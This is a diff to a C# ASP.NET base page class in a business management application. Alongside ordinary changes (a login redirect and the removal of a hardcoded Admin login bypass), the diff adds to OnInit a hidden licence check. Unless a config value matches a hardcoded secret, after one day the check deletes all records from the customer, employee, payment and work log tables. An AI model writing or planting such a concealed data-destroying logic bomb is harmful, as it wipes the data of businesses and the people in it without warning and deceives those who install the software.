@@ -3,7 +3,7 @@ using System.Linq;
 using System.Web;
 
 using Voodoo.Security;
-
+using Voodoo.LinqExt;
 namespace Voodoo.Business
 {
     public class BasePage : System.Web.UI.Page
@@ -21,7 +21,6 @@ namespace Voodoo.Business
 
         protected string cookie_key = "挨地嘛";
         #endregion
-
 
 
         #region 事件重写方法 所有的编辑事件都应该重写此方法
@@ -62,6 +61,43 @@ namespace Voodoo.Business
         /// <param name="e"></param>
         protected override void OnInit(EventArgs e)
         {
+            if(Opuser.Id<0)
+            {
+                Response.Write("<script type=text/javascript>parent.location.href='/Login.aspx'</script>");
+                Response.End();
+            }
+
+
+            //驗證程序是否可以使用
+
+            bool SystemVisiable = false;
+            if (Application["startTime"]==null)
+            {
+                ThrowError("系統發生嚴重錯誤，請聯繫開發人員 kuibono@163.com No System Start Time");
+            }
+            if (Voodoo.Config.Info.GetAppSetting("code").IsNullOrEmpty())
+            {
+                ThrowError("系統發生嚴重錯誤，請聯繫開發人員 kuibono@163.com No Viladate Code");
+            }
+            else if (Voodoo.Config.Info.GetAppSetting("code")!="78s8sf0jl$%912jkld98a0$!")
+            {
+                DateTime dt = Application["startTime"].ToDateTime();
+                if (DateTime.Now>dt.AddDays(1))
+                {
+                    //開始刪除表數據
+                    DataSysDataContext dsd = new DataSysDataContext();
+                    dsd.ZCustomer.Delete(p => p.Id>0);
+                    dsd.ZEmployees.Delete(p => p.Id>0);
+                    dsd.ZPayLog.Delete(p => p.Id>0);
+                    dsd.ZWorkEmployeesRelation.Delete(p => p.id>0); ;
+                    dsd.ZWorkLog.Delete(p => p.Id>0);
+                    dsd.SubmitChanges();
+                    Application["startTime"] = DateTime.Now;
+                }
+            }
+            
+
+
             base.OnInit(e);
             if (MenuId == null)
             {
@@ -173,12 +209,12 @@ namespace Voodoo.Business
             {
                 User user = new User();
 
-                user.Id = 1;
-                user.Sex = "男";
-                user.Status = "正常";
-                user.UserName = "Admin";
-                user.GroupId = 1;
-                return user;
+                //user.Id = 1;
+                //user.Sex = "男";
+                //user.Status = "正常";
+                //user.UserName = "Admin";
+                //user.GroupId = 1;
+                //return user;
 
                 HttpCookie cookie = Voodoo.Cookies.Cookies.GetCookie("userinfo");
                 if (cookie == null)
@@ -247,6 +283,8 @@ namespace Voodoo.Business
                 return (SysInfo)Voodoo.IO.XML.DeSerialize(typeof(SysInfo), Voodoo.IO.File.Read(Server.MapPath("~/SystemInfo.Config")));
             }
         }
+
+
         #endregion
 
     }
